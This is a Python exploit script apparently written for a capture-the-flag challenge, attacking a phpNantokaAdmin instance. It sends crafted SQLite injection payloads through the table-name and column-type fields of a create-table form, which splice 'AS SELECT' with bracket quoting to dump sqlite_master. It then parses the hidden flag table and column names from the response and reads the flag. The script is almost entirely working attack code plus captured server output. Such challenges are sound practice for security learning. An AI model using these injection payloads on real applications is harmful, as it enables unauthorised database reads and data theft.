import os
import requests
import re


url = 'http://9cd826fc-a440-4f2c-98f9-1f82d9cf0f33.node5.buuoj.cn:81'

r = requests.post(url + '?page=create', data={
  'table_name': 't AS SELECT sql [',
  'columns[0][name]': 'abc',
  'columns[0][type]': ']FROM sqlite_master;'
})

"""
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <link rel="stylesheet" href="style.css">
    <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
    <title>phpNantokaAdmin</title>
  </head>
  <body>
    <h1>phpNantokaAdmin</h1>
    <h2>t (<a href="?page=delete">Delete table</a>)</h2>
    <form action="?page=insert" method="POST">
      <table>
        <tr>
          <th> (dummy1 TEXT, dummy2 TEXT, `abc` </th>
        </tr>
        <tr>
          <td>CREATE TABLE `flag_bf1811da` (`flag_2a2d04c3` TEXT)</td>
        </tr>
        <tr>
          <td></td>
        </tr>
        <tr>
          <td><input type="text" name="values[]"></td>
        </tr>
      </table>
      <input type="submit" value="Insert values">
    </form>
  </body>
</html>
"""
# table is flag_bf1811da 
# column is flag_2a2d04c3

flag_table = re.findall(r'CREATE TABLE `(.+?)`', r.content.decode())[0]
flag_column = re.findall(r'\(`(.+?)` TEXT', r.content.decode())[0]
print('table:', flag_table)
print('column:', flag_column)

r = requests.post(url + '?page=create', data={
  'table_name': f't AS SELECT[{flag_column}][',
  'columns[0][name]': 'abc',
  'columns[0][type]': f']FROM[{flag_table}];'
})

print(r.content.decode())
